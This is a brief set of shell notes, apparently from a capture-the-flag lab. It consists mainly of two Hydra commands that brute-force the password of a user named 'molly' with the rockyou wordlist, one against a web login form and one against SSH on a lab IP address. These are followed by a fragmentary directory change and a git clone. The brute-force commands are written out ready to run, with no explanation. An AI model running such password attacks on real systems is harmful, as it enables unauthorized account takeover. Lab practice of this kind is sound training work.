hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.87.232 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.87.232 -t 4 ssh

~$ cd /user/???
~$ git clone https://github.com/id8/htm.git